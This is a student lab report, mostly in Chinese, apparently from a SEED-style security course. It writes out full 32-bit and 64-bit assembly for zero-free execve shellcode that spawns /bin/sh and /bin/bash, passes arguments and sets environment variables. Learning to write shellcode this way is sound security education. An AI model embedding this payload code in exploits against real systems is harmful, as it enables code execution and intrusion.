### Task 1 Writing Shell Code

#### 1.a The Entire Process

操作步骤如下：
 - 编译mysh.s，得到二进制文件
 - 执行得到的二进制文件，同时查看PID。这里两个shell的PID不同，证明我们通过mysh得到了一个新的shell

![[Pasted image 20231027211521.png]]

- 对生成的.o文件反汇编，提取机器码

![[Pasted image 20231027211925.png]]

- 使用xxd打印二进制文件内容，找到shell的机器码。
- 上一步操作中我们知道机器码由31c0开头，cd80结束。
- 截取机器码部分，将其内容复制到convert.py中

![[Pasted image 20231027212121.png]]

![[Pasted image 20231027212228.png]]

然后执行convert.py，得到16进制格式的机器码：

![[Pasted image 20231027212314.png]]

#### 1.b Eliminating Zeros from the Code

对mysh.s逐行解释如下：

```assembly
section .text
```

指定了代码段的名称，即将要定义的指令代码所在的区域。

```assembly
global _start
```

声明了一个全局标号"\_start"，它将作为程序的入口点。

```assembly
_start:
```

程序的入口标号，程序将从这里开始执行。

```assembly
xor  eax, eax     ; Set eax to 0
```

使用异或操作将寄存器eax的值设置为0。

```assembly
push eax          ; Use 0 to terminate the string
push "//sh" 
push "/bin"
```

将字符串"/bin"和"//sh"以及一个0依次压入栈中，用于构造参数字符串。

```assembly
mov  ebx, esp     ; Get the string address
```

将esp寄存器的值（指向栈顶）赋给ebx寄存器，即获取参数字符串的地址。

```assembly
push eax          ; argv[1]] = 0
push ebx          ; argv[0]] points "/bin//sh"
mov  ecx, esp     ; Get the address of argv[]]
```

将0和参数字符串的地址压入栈中，用于构造参数数组argv[]]，并将栈顶地址赋给ecx寄存器，获取参数数组的地址。

```assembly
xor  edx, edx     ; No env variables
```

使用异或操作将寄存器edx的值设置为0，表示没有环境变量。

```assembly
xor  eax, eax     ; eax = 0x00000000
mov   al, 0x0b    ; eax = 0x0000000b
int 0x80
```

将寄存器eax的值设置为0（通过异或操作），然后将寄存器al的值设置为0x0b，即系统调用号为11（execve），最后使用int 0x80指令触发系统调用，执行execve函数来执行"/bin//sh"程序，并传递参数数组argv[]]和环境变量数组envp[]]。

代码中使用零的四个不同位置如下：

1. `xor eax, eax`：  
    将eax寄存器与自身进行异或操作，将eax的值设置为零。这是为了使用零作为`execve`系统调用的第一个参数，表示要执行的系统调用编号。
    
2. `push eax`：  
    将eax寄存器的值压入栈中，以在后续的指令中使用。这是为了将零作为`execve`系统调用的第三个参数，表示没有环境变量。
    
3. `push eax`：  
    将零压入栈中作为字符串的终止符。这是为了构造参数字符串的结尾，确保字符串被正确地终止。
    
4. `push ebx`：  
    将ebx寄存器的值（指向"/bin//sh"字符串的地址）压入栈中，作为参数字符串的起始地址。这里没有直接使用零，而是通过字符串的地址来间接表示零。

##### Task
		In Line 1 of the shellcode mysh.s, we push "//sh" into the stack. Actually, we just want to push "/sh" into the stack, but the push instruction has to push a 32-bit number. Therefore, we add a redundant / at the beginning; for the OS, this is equivalent to just one single /.For this task, we will use the shellcode to execute /bin/bash, which has 9 bytes in the command string (10 bytes if counting the zero at the end). Typically, to push this string to the stack, we need to make the length multiple of 4, so we would convert the string to /bin////bash. However, for this task, you are not allowed to add any redundant / to the string, i.e., the length of the command must be 9 bytes (/bin/bash). Please demonstrate how you can do that. In addition to showing that you can get a bash shell, you also need to show that there is no zero in your code.

利用Manual中提到的知识，我们采用左移右移24位来将相关位置为0，用“666”来占位。

![[Pasted image 20231028113906.png]]

编译运行：

![[Pasted image 20231028114120.png]]

可以看到两次执行的shell PID不同，证明我们成功创建了一个新shell。同时，查看机器码，其中不含%0.

![[Pasted image 20231028114203.png]]

#### 1.c Providing Arguments for System Calls

在本任务中，我们需要修改mysh.s，使得其能够响应“/bin/sh -c "ls -a"”。与之前一致，我们不能够使机器码中出现0，所以采用重复的/或者占位符来构造0.

添加注释，修改后的mysh.s如下：
```assembly
section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor eax, eax     ; Set eax to 0
      push eax         ; Use 0 to terminate the string

      push "//sh"      ; Push command string "//sh"
      push "/bin"      ; Push command string "/bin"
      mov ebx, esp     ; Store the address of argv[0]] (command string)

      push eax         ; Null terminator for argv[1]]
      mov eax, "##-c"  ; Load the argument string "-c"
      shr eax, 16      ; Clear the high 16 bits of eax
      push eax         ; Push the processed argument string "-c" for argv[0]]
      xor eax, eax     ; Set eax to 0
      mov ecx, esp     ; Store the address of argv[1]] (argument string)

      mov eax, "##la"  ; Load the argument string "la"
      shr eax, 16      ; Clear the high 16 bits of eax
      push eax         ; Push the processed argument string "la" for argv[2]]
      xor eax, eax     ; Set eax to 0
      push "ls -"      ; Push the command string "ls -"
      mov edx, esp     ; Store the address of argv[2]] (command with argument)

      push eax         ; Null terminator for envp (no environment variables)

      push edx         ; Push the address of argv[2]] (command with argument)
      push ecx         ; Push the address of argv[1]] (argument string)
      push ebx         ; Push the address of argv[0]] (command string)
      
      mov ecx, esp     ; Store the address of the argument array argv[]]
      xor edx, edx     ; No environment variables
      xor eax, eax     ; Set eax to 0
      mov al, 0x0b     ; Set al to 0x0b (execve system call number)
      int 0x80         ; Invoke the execve system call
```

编译运行，结果如预期。

![[Pasted image 20231028125626.png]]

查看机器码：

![[Pasted image 20231028125745.png]]

#### 1.d Providing Environment Variables for execve()

本任务要求编写一份shellcode来执行“/usr/bin/env”命令，该命令可以打印出以下环境变量:
	aaa=1234
	bbb=5678
	cccc=1234
注意到cccc=1234实际上有9位，我们考虑将最后的4单独提出来，并利用占位的方式添加标志字符串结尾的0。

myenv.s完整代码如下：务必注意格式......

```assembly
section .text
    global _start
        _start:
            ; Constructing the environment variables:
            xor eax, eax
            push eax                ;标志字符串结束
            push "1234"
            push "aaa="
            mov ebx, esp            ;构造env[0]]

            xor eax, eax
            push eax                ;标志字符串结束
            push "5678"
            push "bbb="
            mov ecx, esp            ;构造env[1]]

            mov eax, "###4"
            shr eax, 24             ;右移24位，使得高位为0，从而插入0
            push eax                ;标志字符串结束
            push "=123"
            push "cccc"
            mov edx, esp            ;构造env[2]],也采用占位的方式实现末尾加0

            xor eax, eax
            push eax                ;标志字符串结束
            push edx
            push ecx
            push ebx
            mov edx, esp            ;将所有的环境变量入栈
  
            ; Store the argument string on stack
            xor eax, eax            ; 将eax寄存器置为0
            push eax                ; 将0推入栈中，用作字符串的终止符
            push "/env"            
            push "/bin"
            push "/usr"             ; 将字符串"/usr/bin/env"推入栈中
            mov ebx, esp            ; 将ebx寄存器设置为栈顶的地址
            
            ; Construct the argument array argv[]]
            push eax                ; 将0推入栈中，作为argv[1]]的值
            push ebx                ; 将ebx寄存器的值推入栈中，作为argv[0]]的值
            mov ecx, esp            ; 将ecx寄存器设置为栈顶的地址
  
            ; Invoke execve()
            xor eax, eax            ; 将eax寄存器置为0
            mov al, 0x0b            ; 表示execve系统调用的系统调用号
            int 0x80                ; 触发软中断，执行系统调用
```

编译运行效果：

![[Pasted image 20231028143922.png]]

### Task 2 Using Code Segment

#### 任务一：解释代码：
给出添加注释后的代码如下：

```assembly
section .text
  global _start
    _start:
        BITS 32
        jmp short two           ;跳转到two的位置
	        one:                ;one的位置
        pop ebx                 ;将栈顶弹出，赋值给ebx
        xor eax, eax            ;设置eax为0
        mov [ebx+7]], al         ;eax最低9为复制到ebx+7的位置
        mov [ebx+8]], ebx        ;ebx复制到ebx+8的位置，覆盖AAAA
        mov [ebx+12]], eax       ;eax复制到ebx+12的位置，覆盖BBBB
        lea ecx, [ebx+8]]        ;ebx+8开始的4个字节复制到ecx
        xor edx, edx            ;设置edx为0
        mov al,  0x0b           ;execve的系统调用号
        int 0x80                ;系统中断
	        two:
        call one                ;调用one标签下的函数
        db '/bin/sh*AAAABBBB'
```

![[Pasted image 20231028162129.png]]

程序one标签下详细解释了如何将”/bin/sh\*AAAABBBB“后面的\*AAAABBBB变为0。
- 首先将eax置为0，然后将其复制到ebx+7的位置，即把\*变为0
- 然后将ebx复制到ebx+8的位置，使得AAAA位置为指向0的地址，也实现了清零。
- 然后将eax寄存器的值赋给ebx+12的位置，即将BBBB清零（eax寄存器为32位）
- 最后将ebx+8的地址赋给ecx寄存器，使得ecx的值也为0

mysh2.s还可以用C语言解释如下：
```c
char *cmd[]]={"/bin/sh",NULL};
execve(cmd[0]],cmd,NULL);
```
#### 任务二 编写shellcode，运行/usr/bin/env，打印a=11，b=22

我们可以通过命令行直接打印：

```bash
/usr/bin/env - a=11 b=22
```

![[Pasted image 20231028162725.png]]

于是我们直接构造命令字符串，一共有四个组成部分：
- /usr/bin/env
- \-
- a=11
- b=22

于是我们构造 "/usr/bin/env\*-\*a=11\*b=22\*AAAABBBBCCCCDDDDEEEE"
其中：
- EEEE存放0，标志结尾。
- \*用来代位0，防止指令字符串中间出现0
- ABCD用来代位前面的四个组成部分

编写汇编程序如下：

```assembly
section .text
  global _start
    _start:
    BITS 32
    jmp short two    
        
    one:                  
    pop ebx              
    xor eax, eax
    mov [ebx+12]], al      ; /usr/bin/env%0
    mov [ebx+14]], al      ; -%0  
    mov [ebx+19]], al      ; a=11%0
    mov [ebx+24]], al      ; b=22%0
    
    lea edx, [ebx+0]]
    mov [ebx+25]], edx     ; 将/usr/bin/env地址移到AAAA处
  
    lea edx, [ebx+13]]
    mov [ebx+29]], edx     ; 将-的地址移到BBBB处

    lea edx, [ebx+15]]
    mov [ebx+33]], edx     ; 将a=11的地址移到CCCC处
    
    lea edx, [ebx+20]]
    mov [ebx+37]], edx     ; 将b=22的地址移到DDDD处

    mov [ebx+41]], eax     ; 用0000填充EEEE
    lea ecx, [ebx+25]]     ; 传参

    xor edx, edx
    mov al,  0x0b
    int 0x80
     two:
    call one
    db '/usr/bin/env*-*a=11*b=22*AAAABBBBCCCCDDDDEEEE'
```

运行效果如下，成功完成既定目标。

![[Pasted image 20231028165709.png]]

### Task 3 Writing 64-bit Shellcode

#### 任务要求
仿照Task1.b编写64位shellcode，但是需要执行"/bin/bash"而不是"/bin/sh"，并且在命令字符串中不允许使用任何多余的斜杠（/），同时命令的长度必须为9个字节（/bin/bash）

与任务1.b思路一致，我们可以采用占位符的方式，将/bin/bash的前八个字符单独取出，再将最后的h用#######h，然后通过右移56位的方式将占位符置0.

最后编写的shell程序如下：
```assembly
section .text
  global _start
    _start:
      ; The following code calls execve("/bin/sh", ...)
      xor  rdx, rdx       ; 3rd argument
      push rdx
      mov rax,  '#######h'
      shr rax,  56
      push rax
      mov rax, '/bin/bas'
      push rax
      mov rdi, rsp        ; 1st argument
      push rdx
      push rdi
      mov rsi, rsp        ; 2nd argument
      xor  rax, rax
      mov al, 0x3b        ; execve()
      syscall
```

运行结果如下，成功完成既定任务。

![[Pasted image 20231029141835.png]]